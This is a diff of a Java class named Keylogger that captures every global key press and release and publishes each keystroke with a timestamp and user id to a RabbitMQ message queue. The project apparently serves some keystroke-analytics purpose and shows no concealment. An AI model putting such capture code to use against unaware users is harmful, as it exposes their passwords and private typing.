@@ -11,6 +11,7 @@ import com.rabbitmq.client.ConnectionFactory;
 
 public class Keylogger implements NativeKeyListener{
   private final String EXCHANGE_NAME = "strokes";
+  private final int id = 1;
   private Channel channel; 
 
   public Keylogger() throws Exception{
@@ -25,9 +26,7 @@ public class Keylogger implements NativeKeyListener{
   public void nativeKeyPressed(NativeKeyEvent nativeEvent){
     try {
       String key = MyKeyEvent.getKeyText(nativeEvent.getKeyCode());
-      int id = 1; // Because we don't have login yet
-      String payload = String.format("{\"author\": {\"id\" : \"%d\"},\"pressedKey\": \"%s\", \"ts\": \"%s\"}", id, key, new Timestamp(System.currentTimeMillis()).toString());
-      channel.basicPublish(EXCHANGE_NAME,"",null,payload.getBytes());
+      channel.basicPublish(EXCHANGE_NAME,"",null,buildMessage(key, true).getBytes());
     } catch (IOException e) {
       System.err.println(e);
       // log this maybe
@@ -35,7 +34,17 @@ public class Keylogger implements NativeKeyListener{
   }
 
   @Override
-  public void nativeKeyTyped(NativeKeyEvent nativeEvent) {
-    
+  public void nativeKeyReleased(NativeKeyEvent nativeEvent) {
+    try {
+      String key = MyKeyEvent.getKeyText(nativeEvent.getKeyCode());
+      channel.basicPublish(EXCHANGE_NAME,"",null,buildMessage(key, false).getBytes());
+    } catch (Exception e) {
+      System.err.println(e);
+      // log this maybe
+    }
+  }
+
+  private String buildMessage(String key, boolean isKeyPress){
+    return String.format("{\"author\": {\"id\" : \"%d\"},\"keyValue\": \"%s\", \"isKeyPress\": \"%b\", \"ts\": \"%s\"}", id, key, isKeyPress, new Timestamp(System.currentTimeMillis()).toString());
   }
 }
